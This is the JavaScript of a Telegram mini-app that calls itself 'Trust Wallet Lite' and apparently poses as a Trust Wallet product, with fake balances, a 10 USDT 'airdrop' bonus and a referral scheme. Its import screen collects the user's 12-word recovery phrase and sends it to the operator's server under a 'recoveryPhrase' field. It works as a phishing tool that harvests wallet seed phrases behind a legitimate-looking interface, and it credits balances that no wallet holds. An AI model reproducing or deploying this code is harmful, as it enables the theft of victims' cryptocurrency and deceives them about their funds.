// ============================================================================
// TRUST WALLET LITE - PURE API VERSION (No Firebase Client)
// ============================================================================

// ====== TELEGRAM INIT ======
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
}

// ====== STATE ======
let userData = null;
let isAdmin = false;
let currentPage = 'wallet';
const AIRDROP_BONUS = 10;

// ====== API CALLS ======
async function apiCall(endpoint, method = 'GET', body = null) {
    const options = { method, headers: { 'Content-Type': 'application/json' } };
    if (body) options.body = JSON.stringify(body);
    const response = await fetch(`/api${endpoint}`, options);
    return response.json();
}

async function createUser(userId, userData) {
    return apiCall('/users', 'POST', { userId, userData });
}

async function getUser(userId) {
    return apiCall(`/users/${userId}`);
}

async function updateUser(userId, updates) {
    return apiCall(`/users/${userId}`, 'PATCH', { updates });
}

async function processReferral(referrerId, newUserId) {
    return apiCall('/referrals', 'POST', { referrerId, newUserId });
}

async function createDepositAddress(userId, currency) {
    return apiCall('/deposit-address', 'POST', { userId, currency });
}

// ====== USER MANAGEMENT ======
function getUserId() {
    return localStorage.getItem('twt_user_id');
}

function saveUserData() {
    if (userData) {
        localStorage.setItem(`user_${userData.userId}`, JSON.stringify(userData));
        updateUser(userData.userId, userData);
    }
}

async function loadUserData() {
    const userId = getUserId();
    if (!userId) return false;
    
    const saved = localStorage.getItem(`user_${userId}`);
    if (saved) {
        userData = JSON.parse(saved);
        const result = await getUser(userId);
        if (result.success && result.data) {
            userData = { ...userData, ...result.data };
            saveUserData();
        }
        return true;
    }
    return false;
}

// ====== ONBOARDING ======
async function createNewWallet() {
    const btn = document.getElementById('createWalletBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
    btn.disabled = true;
    
    try {
        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('twt_user_id', newUserId);
        
        const urlParams = new URLSearchParams(window.location.search);
        const startParam = urlParams.get('startapp');
        
        const newUserData = {
            userId: newUserId,
            userName: 'User',
            referralCode: newUserId.slice(-8).toUpperCase(),
            balances: {
                TWT: 0, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0,
                SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
            },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            transactions: [{
                type: 'airdrop',
                amount: AIRDROP_BONUS,
                currency: 'USDT',
                timestamp: new Date().toISOString()
            }],
            createdAt: new Date().toISOString()
        };
        
        await createUser(newUserId, newUserData);
        
        if (startParam) {
            await processReferral(startParam, newUserId);
        }
        
        userData = newUserData;
        saveUserData();
        
        document.getElementById('onboardingScreen').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        showWallet();
        showToast('✅ Wallet created! +10 USDT');
    } catch (error) {
        console.error(error);
        showToast('Failed to create wallet', 'error');
    } finally {
        btn.innerHTML = 'Create a new wallet';
        btn.disabled = false;
    }
}

function showImportModal() {
    const grid = document.getElementById('wordsGrid');
    grid.innerHTML = '';
    for (let i = 1; i <= 12; i++) {
        grid.innerHTML += `
            <div class="word-field">
                <div class="word-label">${i}</div>
                <input type="text" id="word_${i}" class="word-input" placeholder="word ${i}">
            </div>
        `;
    }
    document.getElementById('importModal').classList.add('show');
}

async function importWallet() {
    const words = [];
    for (let i = 1; i <= 12; i++) {
        const word = document.getElementById(`word_${i}`)?.value.trim();
        if (!word) {
            showToast(`Enter word ${i}`, 'error');
            return;
        }
        words.push(word);
    }
    
    const btn = document.getElementById('confirmImportBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
    btn.disabled = true;
    
    try {
        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('twt_user_id', newUserId);
        
        const urlParams = new URLSearchParams(window.location.search);
        const startParam = urlParams.get('startapp');
        
        const newUserData = {
            userId: newUserId,
            userName: 'User',
            recoveryPhrase: words.join(' '),
            referralCode: newUserId.slice(-8).toUpperCase(),
            balances: {
                TWT: 0, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0,
                SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
            },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            transactions: [{
                type: 'airdrop',
                amount: AIRDROP_BONUS,
                currency: 'USDT',
                timestamp: new Date().toISOString()
            }],
            createdAt: new Date().toISOString()
        };
        
        await createUser(newUserId, newUserData);
        
        if (startParam) {
            await processReferral(startParam, newUserId);
        }
        
        userData = newUserData;
        saveUserData();
        
        closeModal('importModal');
        document.getElementById('onboardingScreen').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        showWallet();
        showToast('✅ Wallet imported! +10 USDT');
    } catch (error) {
        console.error(error);
        showToast('Failed to import wallet', 'error');
    } finally {
        btn.innerHTML = 'Import Wallet';
        btn.disabled = false;
    }
}

// ====== NAVIGATION ======
function showWallet() {
    currentPage = 'wallet';
    document.getElementById('walletSection').classList.remove('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    const container = document.getElementById('walletContainer');
    container.innerHTML = `
        <div class="balance-card">
            <div class="total-balance" id="totalBalance">$0</div>
        </div>
        <div class="action-buttons">
            <button class="action-btn" onclick="showDepositModal()"><i class="fas fa-plus-circle"></i><span>Deposit</span></button>
            <button class="action-btn" onclick="showWithdrawModal()"><i class="fas fa-minus-circle"></i><span>Withdraw</span></button>
            <button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>Send</span></button>
            <button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-qrcode"></i><span>Receive</span></button>
        </div>
        <div id="assetsList"></div>
    `;
    
    if (userData) {
        const total = (userData.balances.USDT || 0) + (userData.balances.TWT || 0) * 1.25;
        document.getElementById('totalBalance').textContent = '$' + total.toFixed(2);
        
        document.getElementById('assetsList').innerHTML = `
            <div class="asset-item">
                <div class="asset-left"><div class="asset-info"><h4>USDT</h4><p>Tether</p></div></div>
                <div class="asset-right"><div class="asset-balance">$${(userData.balances.USDT || 0).toFixed(2)}</div></div>
            </div>
            <div class="asset-item">
                <div class="asset-left"><div class="asset-info"><h4>TWT</h4><p>Trust Wallet Token</p></div></div>
                <div class="asset-right"><div class="asset-balance">${(userData.balances.TWT || 0).toLocaleString()} TWT</div></div>
            </div>
        `;
    }
}

function showSwap() {
    currentPage = 'swap';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.remove('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    document.getElementById('swapContainer').innerHTML = `<div style="text-align:center;padding:40px;">🔄 Swap feature ready</div>`;
}

function showAirdrop() {
    currentPage = 'airdrop';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.remove('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    const inviteLink = userData ? `https://t.me/TrustTgWalletbot/TWT?startapp=${userData.referralCode}` : '';
    
    document.getElementById('referralContainer').innerHTML = `
        <div class="referral-stats">
            <div class="stat-card"><span>Total Invites</span><span id="totalInvites">${userData?.inviteCount || 0}</span></div>
            <div class="stat-card"><span>USDT Earned</span><span id="usdtEarned">${(userData?.totalUsdtEarned || 0).toFixed(2)}</span></div>
        </div>
        <div class="referral-link-card">
            <div class="link-container">
                <input type="text" id="inviteLink" value="${inviteLink}" readonly>
                <button class="copy-btn" onclick="copyToClipboard('${inviteLink}')"><i class="fas fa-copy"></i></button>
            </div>
        </div>
    `;
}

function showTWTPay() {
    currentPage = 'twtpay';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.remove('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    document.getElementById('twtpayContainer').innerHTML = `
        <div class="virtual-card">
            <div class="card-brand">TWT Pay</div>
            <div class="card-balance">
                <div>Balance: ${userData?.balances?.TWT || 0} TWT</div>
                <div>≈ $${((userData?.balances?.TWT || 0) * 1.25).toFixed(2)} USD</div>
            </div>
        </div>
    `;
}

function showSettings() {
    currentPage = 'settings';
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('referralSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.remove('hidden');
    document.getElementById('settingsContainer').innerHTML = `
        <div class="settings-list">
            <div class="settings-item logout-btn" onclick="logout()">
                <i class="fas fa-sign-out-alt"></i>
                <div><div class="label">Logout</div></div>
            </div>
        </div>
    `;
}

// ====== MODALS ======
function showDepositModal() { document.getElementById('depositModal').classList.add('show'); }
function showWithdrawModal() { document.getElementById('withdrawModal').classList.add('show'); }
function showSendModal() { document.getElementById('sendModal').classList.add('show'); }
function showReceiveModal() { 
    document.getElementById('receiveModal').classList.add('show'); 
    document.getElementById('receiveAddress').innerText = userData?.userId || '';
}
function copyToClipboard(text) { 
    navigator.clipboard.writeText(text); 
    showToast('Copied!'); 
}
function closeModal(id) { document.getElementById(id).classList.remove('show'); }
function showToast(msg) { 
    const toast = document.getElementById('toast'); 
    toast.querySelector('#toastMessage').textContent = msg; 
    toast.classList.remove('hidden'); 
    setTimeout(() => toast.classList.add('hidden'), 3000); 
}
function logout() { 
    if (confirm('Logout?')) { 
        localStorage.clear(); 
        location.reload(); 
    } 
}

// ====== INIT ======
document.addEventListener('DOMContentLoaded', async () => {
    // Setup navigation
    document.querySelectorAll('.nav-item').forEach(btn => {
        btn.addEventListener('click', () => {
            const tab = btn.getAttribute('data-tab');
            if (tab === 'wallet') showWallet();
            else if (tab === 'swap') showSwap();
            else if (tab === 'referral') showAirdrop();
            else if (tab === 'twtpay') showTWTPay();
            else if (tab === 'settings') showSettings();
        });
    });
    
    // Setup onboarding buttons
    document.getElementById('createWalletBtn').onclick = createNewWallet;
    document.getElementById('importWalletBtn').onclick = showImportModal;
    document.getElementById('confirmImportBtn').onclick = importWallet;
    
    // Load user data
    const hasUser = await loadUserData();
    
    if (hasUser && userData) {
        document.getElementById('onboardingScreen').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        showWallet();
    }
    
    // Hide splash screen
    setTimeout(() => {
        document.getElementById('splashScreen').classList.add('hidden');
    }, 1500);
});

// Expose globals
window.showWallet = showWallet;
window.showSwap = showSwap;
window.showAirdrop = showAirdrop;
window.showTWTPay = showTWTPay;
window.showSettings = showSettings;
window.showDepositModal = showDepositModal;
window.showWithdrawModal = showWithdrawModal;
window.showSendModal = showSendModal;
window.showReceiveModal = showReceiveModal;
window.closeModal = closeModal;
window.copyToClipboard = copyToClipboard;
window.logout = logout;
window.createNewWallet = createNewWallet;
window.importWallet = importWallet;
window.showImportModal = showImportModal;
